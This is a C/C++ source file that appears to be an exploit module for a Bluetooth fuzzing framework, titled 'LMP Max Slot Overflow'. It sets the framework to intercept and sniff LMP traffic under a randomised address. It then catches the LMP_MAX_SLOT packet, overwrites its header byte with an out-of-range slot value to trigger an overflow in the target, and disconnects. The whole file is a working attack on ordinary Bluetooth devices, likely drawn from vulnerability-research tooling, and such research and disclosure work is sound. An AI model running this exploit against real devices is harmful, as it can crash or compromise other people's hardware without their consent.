#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Setup
static const char *module_name()
{
    return "LMP Max Slot Overflow";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 2000;
    config->bluetooth.disable_role_switch = false;
    config->bluetooth.randomize_own_bt_address = true;
    config->options.auto_start = true;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;

    return 0;
}

static uint flag = 0;

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // Wait for LMP_MAX_SLOT
    if (pkt_length >= 4 && IS_LMP_OPCODE(pkt_buf, 45))
    {
        flag = 0;
        pkt_buf[2] = (31 << 3) | 7;
        // pkt_buf[3] = 0x20;
        m_disconnect(p);
        // m_conf_stop_on_crash(p, 1);
        return 1;
    }

    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // Wait for role switch (FHS from slave)
    if (IS_FHS(pkt_buf))
    {
        flag = 1;
    }
    return 0;
}